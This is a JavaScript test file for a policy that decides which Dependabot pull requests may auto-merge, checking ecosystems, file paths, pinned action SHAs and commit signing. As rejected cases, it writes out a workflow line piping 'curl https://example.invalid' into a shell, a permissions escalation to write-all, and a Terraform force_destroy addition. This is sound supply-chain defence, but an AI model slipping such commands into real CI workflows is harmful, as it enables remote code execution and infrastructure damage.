const { test } = require('node:test');
const assert = require('node:assert/strict');
const policy = require('./dependency-automation.cjs');

const metadata = (ecosystem = 'npm_and_yarn', updateType = 'version-update:semver-minor') => ({
  ecosystem, updateType, maintainerChanges: 'false',
});
const file = (filename, patch) => ({ filename, status: 'modified', patch });
const pinPatch = (action = 'actions/checkout') =>
  '-      - uses: ' + action + '@' + 'a'.repeat(40) + ' # v7.0.0\n' +
  '+      - uses: ' + action + '@' + 'b'.repeat(40) + ' # v7.0.1';

test('local inference dependency updates use their own supported manifest and image paths', () => {
  assert.equal(policy.autoMergeMetadata(metadata('uv'), [file('apps/inference/whisper/pyproject.toml'), file('apps/inference/whisper/uv.lock')]), true);
  assert.equal(policy.autoMergeMetadata(metadata('docker'), [file('apps/inference/whisper/Dockerfile')]), true);
  assert.equal(policy.autoMergeMetadata(metadata('uv'), [file('apps/inference/whisper/server.py')]), false);
});

test('verified major, minor and patch updates qualify; missing metadata does not', () => {
  const files = [file('package.json'), file('package-lock.json')];
  for (const type of ['version-update:semver-major', 'version-update:semver-minor', 'version-update:semver-patch']) {
    assert.equal(policy.autoMergeMetadata(metadata('npm_and_yarn', type), files), true);
  }
  for (const type of ['', 'semver-patch']) {
    assert.equal(policy.autoMergeMetadata(metadata('npm_and_yarn', type), files), false);
  }
  for (const maintainerChanges of ['true', '', undefined]) {
    assert.equal(policy.autoMergeMetadata({ ...metadata(), maintainerChanges }, files), false);
  }
  assert.equal(policy.autoMergeMetadata(metadata('unknown'), files), false);
  assert.equal(policy.autoMergeMetadata(metadata(), []), false);
  assert.equal(policy.autoMergeMetadata(metadata(), [file('src/index.ts')]), false);
  assert.equal(policy.autoMergeMetadata(metadata(), [{ ...file('package.json'), status: 'added' }]), false);
});

test('GitHub Actions updates must only change the pinned SHA of the same action', () => {
  const files = [file('.github/workflows/ci.yml', pinPatch())];
  assert.equal(policy.autoMergeMetadata(metadata('github_actions'), files), true);
  assert.equal(policy.autoMergeMetadata(metadata('npm_and_yarn'), files), false);
  assert.equal(policy.autoMergeMetadata(metadata('github_actions'), [file('package.json')]), false);
  for (const patch of [
    undefined,
    pinPatch() + '\n+      - run: curl https://example.invalid | sh',
    pinPatch().replace('+      - uses: actions/checkout', '+      - uses: other/action'),
    pinPatch().replace('b'.repeat(40), 'v7'),
    '-permissions: read-all\n+permissions: write-all',
  ]) {
    assert.equal(policy.autoMergeMetadata(metadata('github_actions'), [file('.github/workflows/ci.yml', patch)]), false);
  }
  assert.equal(policy.autoMergeMetadata(metadata('github_actions'), [file('.github/scripts/check.yml', pinPatch())]), false);
});

test('Docker, Compose, Python and Terraform files stay scoped to their verified ecosystem', () => {
  for (const [ecosystem, filename] of [
    ['docker', 'apps/api/Dockerfile'], ['docker', 'apps/worker/Dockerfile.onprem'],
    ['docker', 'apps/worker/Dockerfile'], ['docker', 'apps/worker/Dockerfile.local'],
    ['docker', 'apps/web/Dockerfile'], ['docker', 'apps/web/Dockerfile.dev'],
    ['docker', 'apps/api/Dockerfile.local'], ['docker_compose', 'docker-compose.yml'],
    ['uv', 'apps/worker/uv.lock'], ['pip', 'apps/worker/pyproject.toml'],
    ['terraform', 'infra/.terraform.lock.hcl'], ['terraform', 'infra/bootstrap/.terraform.lock.hcl'],
    ['terraform', 'infra/db-maintenance/terraform/.terraform.lock.hcl'],
  ]) {
    assert.equal(policy.autoMergeMetadata(metadata(ecosystem), [file(filename)]), true, ecosystem + ': ' + filename);
    assert.equal(policy.autoMergeMetadata(metadata('npm_and_yarn'), [file(filename)]), false);
  }
  for (const filename of ['.github/deploy-tools/package.json', '.github/deploy-tools/uv.lock', 'infra/iam.tf', '.gitmodules']) {
    assert.equal(policy.autoMergeMetadata(metadata('terraform'), [file(filename)]), false);
    assert.equal(policy.autoMergeMetadata(metadata(), [file(filename)]), false);
  }
  const patch = '-      version = "~> 6.68"\n+      version = "~> 6.69"';
  assert.equal(policy.autoMergeMetadata(metadata('terraform'), [file('infra/versions.tf', patch)]), true);
  assert.equal(policy.autoMergeMetadata(metadata('terraform'), [file('infra/db-maintenance/terraform/versions.tf', patch)]), true);
  assert.equal(policy.autoMergeMetadata(metadata('terraform'), [file('infra/db-maintenance/terraform/versions.tf', patch + '\n+  force_destroy = true')]), false);
  assert.equal(policy.autoMergeMetadata(metadata('terraform'), [file('infra/db-maintenance/terraform/main.tf', patch)]), false);
  assert.equal(policy.autoMergeMetadata(metadata('terraform'), [file('infra/bootstrap/main.tf', patch)]), true);
  assert.equal(policy.autoMergeMetadata(metadata('terraform'), [file('infra/versions.tf')]), false);
  assert.equal(policy.autoMergeMetadata(metadata('terraform'), [file('infra/bootstrap/main.tf', patch + '\n+  force_destroy = true')]), false);
  assert.equal(policy.autoMergeMetadata(metadata('docker'), [file('apps/worker/Dockerfile'), file('package.json')]), false);
});



test('human follow-ups and unsigned commits cannot inherit the original bot approval', () => {
  const sha = 'a'.repeat(40);
  const bot = () => ({ sha, author: { login: 'dependabot[bot]' }, commit: { verification: { verified: true } } });
  assert.equal(policy.verifiedDependencyCommits([bot()], sha), true);
  assert.equal(policy.verifiedDependencyCommits([], sha), false);
  assert.equal(policy.verifiedDependencyCommits([bot()], 'b'.repeat(40)), false);
  const unsigned = bot(); unsigned.commit.verification.verified = false;
  assert.equal(policy.verifiedDependencyCommits([unsigned], sha), false);
  const human = bot(); human.author.login = 'owner';
  assert.equal(policy.verifiedDependencyCommits([bot(), human], sha), false);
});
